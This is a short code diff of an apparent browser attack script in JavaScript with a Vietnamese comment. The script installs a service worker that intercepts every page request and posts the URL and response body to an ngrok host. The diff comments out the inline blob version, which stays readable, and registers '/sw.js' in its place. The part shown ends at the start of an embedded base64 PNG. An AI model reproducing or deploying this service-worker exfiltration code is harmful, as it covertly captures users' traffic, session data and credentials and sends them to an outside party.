@@ -1,30 +1,31 @@
 (async () => {
   const baseUrl = location.origin;
   // === 1. Ghi Service Worker bằng blob (không cần HTTPS nếu là blob) ===
-  const swCode = `
-    self.addEventListener('fetch', e => {
-      e.respondWith(
-        fetch(e.request).then(r => {
-          r.clone().text().then(body => {
-            fetch('https://b472c3c5f8cc.ngrok-free.app/log', {
-              method: 'POST',
-              body: JSON.stringify({ url: e.request.url, body }),
-              mode: 'no-cors'
-            });
-          });
-          return r;
-        })
-      );
-    });
-  `;
+  // const swCode = `
+  //   self.addEventListener('fetch', e => {
+  //     e.respondWith(
+  //       fetch(e.request).then(r => {
+  //         r.clone().text().then(body => {
+  //           fetch('https://abcd1234.ngrok.io/log', {
+  //             method: 'POST',
+  //             body: JSON.stringify({ url: e.request.url, body }),
+  //             mode: 'no-cors'
+  //           });
+  //         });
+  //         return r;
+  //       })
+  //     );
+  //   });
+  // `;
 
-  try {
-    const blob = new Blob([swCode], { type: 'application/javascript' });
-    await navigator.serviceWorker.register(URL.createObjectURL(blob), { scope: '/' });
-    console.log('[+] Service Worker registered');
-  } catch (e) {
-    console.warn('[!] Failed to register Service Worker:', e);
-  }
+  // try {
+  //   const blob = new Blob([swCode], { type: 'application/javascript' });
+  //   await navigator.serviceWorker.register(URL.createObjectURL(blob), { scope: '/' });
+  //   console.log('[+] Service Worker registered');
+  // } catch (e) {
+  //   console.warn('[!] Failed to register Service Worker:', e);
+  // }
+  navigator.serviceWorker.register('/sw.js', { scope: '/' });
   const pngBase64 =
     'iVBORw0KGgoAAAANSUhEUgAAAIAAAABcCAYAAACmwr2fAAAAAXNSR0IArs4c6QAAAGxl' +
     'WElmTU0AKgAAAAgABAEaAAUAAAABAAAAPgEbAAUAAAABAAAARgEoAAMAAAABAAIAAIdp' +
